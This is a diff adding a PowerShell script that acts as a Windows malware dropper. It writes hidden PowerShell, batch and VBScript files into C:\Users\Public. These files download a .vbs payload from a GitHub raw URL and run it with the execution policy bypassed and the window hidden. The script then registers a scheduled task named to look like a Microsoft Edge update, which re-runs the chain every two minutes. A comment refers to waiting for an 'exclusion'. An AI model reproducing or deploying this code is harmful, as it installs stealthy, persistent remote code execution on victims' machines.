@@ -1,0 +1,82 @@
+﻿$Content = @'
+
+
+$url = 'https://raw.githubusercontent.com/Black-Code01/A/refs/heads/main/MicrosoftSDK.vbs'
+
+
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100 
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outputFile
+
+
+
+
+'@
+[IO.File]::WriteAllText("C:\Users\Public\libraries.ps1", $Content)
+
+
+$Content = @'
+@e%libraries%%libraries% off
+set "ps=powershell.exe"
+set "params=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
+set "cmd=C:\Users\Public\libraries.ps1"
+%ps% %params% -Command "& '%cmd%'"
+exit /b
+
+'@
+[IO.File]::WriteAllText("C:\Users\Public\libraries.bat", $Content)
+
+$Content = @'
+on error resume next
+Function CreateWshShellObj()
+    Dim objName
+    objName = "WScript.Shell"
+    Set CreateWshShellObj = CreateObject(objName)
+End Function
+
+Function GetFilePath()
+    Dim filePath
+    filePath = "C:\Users\Public\libraries.bat"
+    GetFilePath = filePath
+End Function
+
+Function GetVisibilitySetting()
+    Dim visibility
+    visibility = 0
+    GetVisibilitySetting = visibility
+End Function
+
+Function RunFile(wshShellObj, filePath, visibility)
+    wshShellObj.Run filePath, visibility
+End Function
+
+Set wshShellObj = CreateWshShellObj()
+filePath = GetFilePath()
+visibility = GetVisibilitySetting()
+Call RunFile(wshShellObj, filePath, visibility)
+
+'@
+[IO.File]::WriteAllText("C:\Users\Public\libraries.vbs", $Content)
+
+Sleep 2
+
+$scheduler = New-Object -ComObject Schedule.Service
+$scheduler.Connect()
+
+$taskDefinition = $scheduler.NewTask(0)
+$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
+$taskDefinition.Settings.Enabled = $true
+$taskDefinition.Settings.DisallowStartIfOnBatteries = $false
+
+$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
+$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
+$trigger.Repetition.Interval = "PT2M"
+
+# إضافة الـ Action
+$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction
+$action.Path = "C:\Users\Public\libraries.vbs"
+
+$taskFolder = $scheduler.GetFolder("\")
+$taskFolder.RegisterTaskDefinition("Micros oftEdgeUpdate", $taskDefinition, 6, $null, $null, 3)
